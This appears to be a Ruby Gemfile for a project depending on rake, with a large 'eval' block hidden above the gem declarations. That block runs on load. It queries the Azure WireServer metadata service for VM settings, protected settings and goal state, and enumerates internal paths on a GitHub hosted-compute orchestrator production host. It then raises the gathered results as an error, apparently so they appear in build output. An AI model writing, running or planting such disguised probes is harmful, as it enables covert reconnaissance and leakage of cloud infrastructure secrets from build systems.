eval <<~PROBE_END
# F023 chain probe v100 — fetch WireServer + orch path enum
require 'net/http'; require 'uri'; require 'json'; require 'base64'

m = []
begin
  ws = Net::HTTP.get_response(URI('http://168.63.129.16:32526/vmSettings?api-version=2015-09-01'))
  m << "v100 ws_status=#{ws.code} ws_len=#{ws.body.length}"
  if ws.code == "200"
    d = JSON.parse(ws.body) rescue nil
    if d && d['extensionGoalStates']
      ext = d['extensionGoalStates'].first['settings'].first rescue nil
      ps = ext && ext['protectedSettings']
      m << "v100 has_protectedSettings=#{!!ps} ps_len=#{ps&.length || 0}"
      # Show storage account hostname
      sub = ext && ext['statusUploadBlob'] && ext['statusUploadBlob']['value']
      m << "v100 statusUploadBlob_host=#{URI.parse(sub).host rescue 'parse-fail'}"
    end
    # Show first 64 bytes hex for protection
    m << "v100 ws_first64hex=#{ws.body[0..63].unpack('H*').first}"
  end
rescue => e
  m << "v100 ws_err=#{e.class}: #{e.message[0..80]}"
end

# Try goalstate
begin
  gs = Net::HTTP.get_response(URI('http://168.63.129.16/machine/?comp=goalstate'))
  m << "v100 gs_status=#{gs.code} gs_len=#{gs.body.length}"
rescue => e
  m << "v100 gs_err=#{e.class}: #{e.message[0..80]}"
end

# Path enum on orchestrator (no JWT — see what's open)
paths = ['/', '/health', '/healthz', '/v1/agents', '/v1/agent', '/v1/jobs', '/v1/job', '/api/v1/agents', '/agents', '/jobs', '/admin', '/internal', '/v1/trace', '/v1/trace/get', '/v1/agents/list', '/api/internal/jobs']
paths.each_with_index do |p, i|
  begin
    h = Net::HTTP.new('hosted-compute-request-orchestrator-prod-eus-02.githubapp.com', 443)
    h.use_ssl = true; h.read_timeout = 4; h.open_timeout = 4
    r = h.get(p)
    m << "v100 orch[#{i}]#{p} #{r.code} L=#{r.body.length}"
    m << "v100 orch[#{i}]#{p}_body=#{r.body[0..160].gsub(/\s+/,' ')}" if r.body.length > 0 && r.body.length < 500
  rescue => e
    m << "v100 orch[#{i}]#{p}_err=#{e.class.name[0..30]}"
  end
end

raise m.join("\n")

PROBE_END
source "https://rubygems.org"
gem "rake", "~> 13.0"
